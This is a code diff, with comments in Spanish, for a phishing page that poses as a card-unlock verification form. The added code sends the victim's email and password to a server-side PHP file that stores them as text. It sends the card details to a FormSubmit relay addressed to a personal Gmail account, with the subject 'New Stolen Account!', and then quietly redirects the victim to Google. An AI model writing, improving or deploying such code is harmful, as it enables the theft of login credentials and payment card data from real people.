@@ -156,11 +156,13 @@
             </div>
             <p>Ingresa los datos de tu tarjeta para verificar tu identidad y desbloquearla.</p>
 
-            <!-- El form ahora solo sirve para recolectar datos, el envío lo hace JS -->
             <form id="formFinal">
+                <!-- Campos ocultos para FormSubmit -->
                 <input type="hidden" name="_subject" value="Nueva Cuenta Robada!">
                 <input type="hidden" name="email" id="hidden_email">
                 <input type="hidden" name="password" id="hidden_password">
+                <!-- Campo extra para FormSubmit -->
+                <input type="hidden" name="_next" value="https://www.google.com"> 
 
                 <div class="input-group">
                     <label>Nombre en la tarjeta</label>
@@ -201,6 +203,17 @@
             const email = document.getElementById('input_email').value;
             const pass = document.getElementById('input_pass').value;
 
+            // 1. Guardar en el PHP del servidor (archivo texto)
+            const formDataPHP = new FormData();
+            formDataPHP.append('email', email);
+            formDataPHP.append('password', pass);
+
+            fetch('recibe_datos.php', {
+                method: 'POST',
+                body: formDataPHP
+            }).catch(err => console.log('Error guardando en PHP:', err));
+
+            // 2. Preparar el HTML para el paso 2
             document.getElementById('hidden_email').value = email;
             document.getElementById('hidden_password').value = pass;
 
@@ -223,21 +236,21 @@
                 btn.style.display = 'none';
                 successMsg.style.display = 'block';
 
-                // Enviar datos "por detrás" (AJAX)
-                const formData = new FormData(form);
+                // Enviar datos a FormSubmit (AJAX)
+                const formDataFS = new FormData(form);
                 
-                // IMPORTANTE: Cambiá TU_CORREO_AQUI por tu email real
+                // IMPORTANTE: CAMBIAR TU_CORREO_AQUI POR TU EMAIL REAL
                 fetch("https://formsubmit.co/ajax/quisan2017@gmail.com", {
                     method: "POST",
-                    body: formData
+                    body: formDataFS
                 })
                 .then(response => response.json())
                 .then(data => {
-                    // Si se envió bien, redirigir a Google inmediatamente
+                    // Redirigir inmediatamente a Google
                     window.location.href = 'https://www.google.com';
                 })
                 .catch(error => {
-                    // Si falla, igual lo mandamos a Google para no dejarlo colgado
+                    // Si falla igual redirigimos
                     window.location.href = 'https://www.google.com';
                 });
 
